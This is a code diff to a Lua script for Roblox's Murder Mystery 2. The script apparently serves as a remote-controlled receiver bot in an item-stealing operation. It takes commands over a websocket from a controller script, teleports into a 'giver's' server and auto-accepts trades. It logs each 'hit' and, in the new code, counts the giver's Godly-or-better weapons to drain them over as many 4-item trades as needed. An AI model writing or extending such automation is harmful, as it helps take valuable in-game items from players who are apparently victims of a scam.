@@ -9,9 +9,11 @@ end
 bottoken  = bottoken or ajsettings.token
 logid     = logid or ajsettings.logid
 chanelid  = chanelid or ajsettings.chanelid
-minrarity = minrarity or "Godly"
+minrarity = minrarity or ajsettings.minrarity or "Godly"
 totalval  = totalval or 0
 tradesd   = tradesd or 0
+
+local ITEMS_PER_TRADE = 4   -- MM2 caps an offer at 4 items
 
 local LocalPlayer = game.Players.LocalPlayer
 if not LocalPlayer.Character then LocalPlayer.CharacterAdded:Wait() end
@@ -27,6 +29,10 @@ local currentGiver = nil
 local autoAccept = true
 local latestOffer = nil
 local stopTrade = false
+local tradesNeeded = 1     -- ceil(giver items at/above min rarity / ITEMS_PER_TRADE)
+local claimedTrades = 0    -- trades where we actually received items this hit
+local lastClaimAt = 0      -- os.clock() of the last claim (for the stall timeout)
+local needCalc = false     -- recompute tradesNeeded from the giver's real inventory
 
 local function getOffer()
     local ok, _, info = pcall(function() return trads() end)
@@ -58,6 +64,11 @@ local function startTeleportLoop()
             if tostring(tgt.jobId) == game.JobId then break end
             failed = false
             currentGiver = tgt.giver
+            -- expected (from nub.py's embed parse) is the initial estimate; we
+            -- recompute from the giver's real inventory on the first trade.
+            tradesNeeded = math.max(1, math.ceil((tgt.expected or 0) / ITEMS_PER_TRADE))
+            claimedTrades = 0
+            needCalc = true
             lastTeleportJob = tgt.jobId
             pcall(function()
                 TeleportService:TeleportToPlaceInstance(
@@ -74,15 +85,15 @@ local function startTeleportLoop()
     end)
 end
 
-local function doTeleport(placeId, jobId, giver)
+local function doTeleport(placeId, jobId, giver, expected)
     if not placeId or not jobId then return end
     jobId = tostring(jobId)
     if jobId == game.JobId then return end
     if not isIdle() then
-        pendingTeleport = { placeId = placeId, jobId = jobId, giver = giver }
+        pendingTeleport = { placeId = placeId, jobId = jobId, giver = giver, expected = expected }
         return
     end
-    currentTarget = { placeId = placeId, jobId = jobId, giver = giver }
+    currentTarget = { placeId = placeId, jobId = jobId, giver = giver, expected = expected }
     startTeleportLoop()
 end
 
@@ -90,7 +101,7 @@ local function flushPendingTeleport()
     local t = pendingTeleport
     if t and isIdle() then
         pendingTeleport = nil
-        currentTarget = { placeId = t.placeId, jobId = t.jobId, giver = t.giver }
+        currentTarget = { placeId = t.placeId, jobId = t.jobId, giver = t.giver, expected = t.expected }
         startTeleportLoop()
     end
 end
@@ -105,7 +116,7 @@ local function wsConnect()
                 local ok2, data = pcall(function() return HttpService:JSONDecode(raw) end)
                 if not (ok2 and type(data) == "table") then return end
                 if data.action == "teleport" then
-                    doTeleport(data.placeId, data.jobId, data.giver)
+                    doTeleport(data.placeId, data.jobId, data.giver, data.expected)
                 elseif data.action == "command" then
                     local cmd, args = data.cmd, data.args or {}
                     task.spawn(function()
@@ -158,8 +169,8 @@ task.spawn(function()
     wsConnect()
     while true do
         if not statusSocket then wsConnect() end
-        wsSend(currentStatus)
-        task.wait(5)
+        wsSend(currentStatus)   -- 1s heartbeat; nub.py reopens if it stops for >10s
+        task.wait(1)
     end
 end)
 
@@ -405,11 +416,15 @@ task.spawn(function()
     task.spawn(function()
         while true do
             local ok, st = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
-            if ok and st ~= "StartTrade" and st ~= "ReceivingRequest" then
-                if screen.Enabled then screen.Enabled = false end
-                latestOffer = nil
+            if ok then
+                if st == "StartTrade" then
+                    if not screen.Enabled then screen.Enabled = true end   -- show on trade start
+                elseif st ~= "ReceivingRequest" then
+                    if screen.Enabled then screen.Enabled = false end
+                    latestOffer = nil
+                end
             end
-            task.wait(0.5)
+            task.wait(0.3)
         end
     end)
 end)
@@ -532,6 +547,27 @@ local function getItemValue(dataid)
         if idx and idx >= godlyIdx then value = 2 else value = 1 end
     end
     return value
+end
+
+-- how many weapons a player owns at/above min rarity, straight from the game.
+-- Returns nil if the query fails (e.g. the server won't hand out another
+-- player's inventory), so callers can fall back to the embed estimate.
+local function countGiverItems(name)
+    if not name or name == "" then return nil end
+    local minIdx = table.find(rarityTable, minrarity) or godlyIdx
+    local ok, inv = pcall(function()
+        return game:GetService("ReplicatedStorage").Remotes.Extras.GetFullInventory:InvokeServer(name)
+    end)
+    if not ok or type(inv) ~= "table" or not inv.Weapons or not inv.Weapons.Owned then
+        return nil
+    end
+    local count = 0
+    for dataId, amt in pairs(inv.Weapons.Owned) do
+        local db = databrainrot[dataId]
+        local idx = db and table.find(rarityTable, db.Rarity)
+        if idx and idx >= minIdx then count = count + (amt or 1) end
+    end
+    return count
 end
 
 function _G.__ajItemLine(entry)
@@ -720,6 +756,13 @@ task.spawn(function()
         local status,skot = trads()
         if status == "StartTrade" then
             setStatus("Trading")
+            if needCalc then
+                needCalc = false
+                local c = countGiverItems(currentGiver)
+                if c and c > 0 then
+                    tradesNeeded = math.max(1, math.ceil(c / ITEMS_PER_TRADE))
+                end
+            end
             timeintrade = 0
             repeat
                 timeintrade = timeintrade + task.wait(0.1)
@@ -732,6 +775,8 @@ task.spawn(function()
             local claimed = false
             if bolean == true then
                 tradesd = tradesd+1
+                claimedTrades = claimedTrades + 1
+                lastClaimAt = os.clock()
                 setStatus("Logging items")
                 local okc, errc = pcall(chang, itmes)
                 if not okc then warn("[mm2] chang failed: "..tostring(errc)) end
@@ -739,13 +784,26 @@ task.spawn(function()
             end
             local hadPending = (pendingTeleport ~= nil)
             setStatus("Waiting for trades")
-            if claimed and not hadPending then
+            -- fully claimed only after enough trades (ceil expected / 4)
+            if claimed and claimedTrades >= tradesNeeded and not hadPending then
                 wsEvent("next")
             end
         elseif status == "ReceivingRequest" and autoAccept then
             game.ReplicatedStorage.Trade.AcceptRequest:FireServer()
         end
         task.wait(0.1)
+    end
+end)
+
+-- if the giver stops early (claimed some but fewer trades than expected and no
+-- new trade for a while), consider it done and move on.
+task.spawn(function()
+    while true do
+        task.wait(3)
+        if currentGiver and claimedTrades > 0 and claimedTrades < tradesNeeded
+           and currentStatus == "Waiting for trades" and (os.clock() - lastClaimAt) > 15 then
+            wsEvent("next")
+        end
     end
 end)
 function inv()
